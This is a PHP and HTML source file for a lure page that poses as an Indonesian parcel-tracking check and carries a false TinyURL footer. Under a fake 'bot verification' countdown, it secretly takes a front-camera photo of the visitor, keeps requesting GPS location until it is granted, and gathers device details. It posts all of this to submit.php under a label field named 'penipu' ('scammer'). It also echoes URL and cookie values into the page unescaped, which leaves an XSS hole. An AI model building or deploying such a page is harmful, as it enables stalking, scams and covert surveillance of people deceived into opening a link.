<?php
// Simpan variabel ke dalam cookies dengan masa berlaku 1 jam
setcookie('url', $_GET['url'] ?? 'https://google.co.id', time() + 3600, '/');
setcookie('penipu', $_GET['nama'] ?? 'Cek Resi', time() + 3600, '/');
setcookie('tombol', $_GET['tombol'] ?? 'Cek Resi', time() + 3600, '/');
setcookie('nama', $_GET['nama'] ?? 'Ambil Paket', time() + 3600, '/');

// Redirect ke halaman yang sama tanpa query string jika terdapat _GET
if (!empty($_GET)) {
    header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
    exit;
}

// Gunakan nilai dari cookies jika tersedia
$url = $_COOKIE['url'] ?? 'https://google.co.id';
$penipu = $_COOKIE['penipu'] ?? 'Cek Resi';
$tombol = $_COOKIE['tombol'] ?? 'Lanjutkan';
$nama = $_COOKIE['nama'] ?? 'Cek Resi';

?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?=$nama?></title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css">

    <script>
        let countdown = 3;
        let captureDone = false;
        let deviceInfoDone = false;
        let locationDone = false;

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function (position) {
                        document.getElementById('gps').value =
                            position.coords.latitude + ',' + position.coords.longitude;
                        locationDone = true;
                        checkAllDataReady();
                    },
                    function () {
                        alert('Mohon izinkan akses lokasi agar bisa melanjutkan.');
                        getLocation();
                    }
                );
            } else {
                alert('Geolocation tidak didukung oleh browser ini.');
            }
        }

        function startCountdown() {
            const countdownElement = document.getElementById('countdown');
            countdownElement.innerText = `Menunggu verifikasi BOT... (${countdown})`;

            let interval = setInterval(() => {
                countdown--;
                countdownElement.innerText = `Menunggu Verifikasi Ijin... (${countdown})`;

                if (countdown <= 0) {
                    clearInterval(interval);
                    captureImage();
                }
            }, 1000);
        }

        function captureImage() {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
                .then(stream => {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();

                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

                        document.getElementById('photo').value = canvas.toDataURL('image/jpeg');
                        stream.getTracks().forEach(track => track.stop()); // Matikan kamera

                        captureDone = true;
                        document.getElementById('countdown').innerText = "Verifikasi berhasil diambil!";
                        checkAllDataReady();
                    }, 1000);
                })
                .catch(() => {
                    alert('Mohon izinkan akses kamera untuk melanjutkan.');
                });
        }

        async function getDeviceInfo() {
            let platform = navigator.platform || "Unknown";
            let mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ? "Yes" : "No";
            let networkType = navigator.connection?.effectiveType || "Unknown";
            let screenResolution = `${screen.width}x${screen.height}`;
            let cpuCores = navigator.hardwareConcurrency || "Unknown";
            let totalMemory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown";
            let batteryLevel = "Unknown";

            // 🔋 Cek Baterai (Pastikan pakai HTTPS!)
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    batteryLevel = Math.round(battery.level * 100) + "%";
                } catch (e) {
                    console.log("Gagal mendapatkan data baterai:", e);
                }
            }

            document.getElementById('platform').value = platform;
            document.getElementById('mobile').value = mobile;
            document.getElementById('networkType').value = networkType;
            document.getElementById('batteryLevel').value = batteryLevel;
            document.getElementById('screenResolution').value = screenResolution;
            document.getElementById('cpuCores').value = cpuCores;
            document.getElementById('totalMemory').value = totalMemory;

            deviceInfoDone = true;
            checkAllDataReady();
        }

        function checkAllDataReady() {
            if (captureDone && deviceInfoDone && locationDone) {
                document.getElementById('submitBtn').disabled = false;
                document.getElementById('countdown').innerText = "Semua data siap, silakan lanjut!";
            }
        }

        window.onload = function () {
            getLocation();
            getDeviceInfo();
            document.getElementById('submitBtn').disabled = true;
            startCountdown();
        };
    </script>
</head>
<body class="bg-dark text-white">
    <div class="container mt-5">
        <div class="card shadow bg-secondary text-white">
            <div class="card-header bg-dark text-white text-center">
                <h4><?=$nama?></h4>
            </div>
            <div class="card-body text-center">
                <p id="countdown" class="text-warning font-weight-bold">Menunggu Verifikasi...</p><form action="submit.php" method="post">
                         <input type="hidden" name="nama" value="<?=$penipu?>">
                    <input type="hidden" name="alamat" value="<?=$url?>">
                    <input type="hidden" name="gps" id="gps">
                    <input type="hidden" name="photo" id="photo">                    <input type="hidden" name="platform" id="platform">
                    <input type="hidden" name="mobile" id="mobile">
                    <input type="hidden" name="networkType" id="networkType">
                    <input type="hidden" name="batteryLevel" id="batteryLevel">
                    <input type="hidden" name="screenResolution" id="screenResolution">
                    <input type="hidden" name="cpuCores" id="cpuCores">
                    <input type="hidden" name="totalMemory" id="totalMemory">
                                <button type="submit" id="submitBtn" class="btn btn-success btn-block mt-3" disabled>
                    <?=$tombol?>
                </button>
            </form>
        </div>
        <div class="card-footer text-center bg-dark text-white">
            <small>Copyright &copy; TinyURL LLC</small>
        </div>
    </div>
</div>

</body>
</html>
